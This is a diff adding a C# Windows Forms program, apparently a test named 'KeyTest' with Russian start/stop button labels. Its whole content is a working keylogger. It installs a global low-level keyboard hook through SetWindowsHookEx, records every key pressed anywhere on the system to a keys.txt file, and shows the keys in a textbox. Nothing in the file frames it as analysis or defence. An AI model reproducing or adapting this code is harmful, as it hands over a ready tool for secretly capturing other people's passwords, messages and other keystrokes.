@@ -1,0 +1,113 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace KeyTest
+{
+    public partial class Form1 : Form
+    {
+        bool work = false;
+
+        IntPtr hook = IntPtr.Zero;
+
+        string file = "keys.txt";
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (work == false)
+            {
+                hook = SetHook(proc);
+
+                work = true;
+
+                button1.Text = "стоп";
+            }
+            else
+            {
+                UnhookWindowsHookEx(hook);
+
+                work = false;
+
+                button1.Text = "старт";
+            }
+        }
+
+        private LowLevelKeyboardProc proc;
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            proc = HookCallback;
+        }
+
+        private IntPtr SetHook(LowLevelKeyboardProc p)
+        {
+            using (Process cur = Process.GetCurrentProcess())
+            using (ProcessModule m = cur.MainModule)
+            {
+                return SetWindowsHookEx(13,
+                    p,
+                    GetModuleHandle(m.ModuleName),
+                    0);
+            }
+        }
+
+        delegate IntPtr LowLevelKeyboardProc(
+            int nCode,
+            IntPtr wParam,
+            IntPtr lParam
+        );
+
+        const int WM_KEYDOWN = 0x0100;
+
+        IntPtr HookCallback(
+            int nCode,
+            IntPtr wParam,
+            IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vk = Marshal.ReadInt32(lParam);
+
+                string key = ((Keys)vk).ToString();
+
+                File.AppendAllText(file, key + " ");
+
+                textBox1.Text += key + " ";
+            }
+
+            return CallNextHookEx(hook,
+                nCode,
+                wParam,
+                lParam);
+        }
+
+        [DllImport("user32.dll")]
+        static extern IntPtr SetWindowsHookEx(
+            int idHook,
+            LowLevelKeyboardProc lpfn,
+            IntPtr hMod,
+            uint dwThreadId
+        );
+
+        [DllImport("user32.dll")]
+        static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr CallNextHookEx(
+            IntPtr hhk,
+            int nCode,
+            IntPtr wParam,
+            IntPtr lParam
+        );
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetModuleHandle(string lpModuleName);
+    }
+}
